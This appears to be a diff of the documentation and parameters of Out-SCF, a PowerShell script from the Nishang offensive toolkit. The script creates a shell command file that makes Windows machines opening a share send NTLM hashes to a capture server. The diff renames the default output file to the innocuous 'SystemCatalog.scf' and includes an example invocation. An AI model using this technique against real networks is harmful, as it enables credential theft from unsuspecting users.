@@ -12,7 +12,6 @@ The IP address of the capture server is specifed in the icon field.
 There are various good servers to capture hashes in this way, a PowerShell one
 is Inveigh (https://github.com/Kevin-Robertson/Inveigh)
 
-
 The script is based on a blog by Rob Fuller (@mubix)
 
 .PARAMETER IPAddress
@@ -27,7 +26,6 @@ PS > Out-SCF IPAddress 192.168.230.1
 Put the generated scf file in a shared folder. When a user opens the share (it is not required to open the scf file), 
 his NTLM hashes can be captured on the capture server running on the specified IP.
 
-
 .LINK
 https://room362.com/post/2016/smb-http-auth-capture-via-scf
 https://github.com/samratashok/nishang
@@ -41,7 +39,7 @@ https://github.com/samratashok/nishang
 
         [Parameter(Position = 3, Mandatory = $False)]
         [String]
-        $OutputPath = "$pwd\Windows Explorer.scf"
+        $OutputPath = "$pwd\SystemCatalog.scf"
     )
 
     
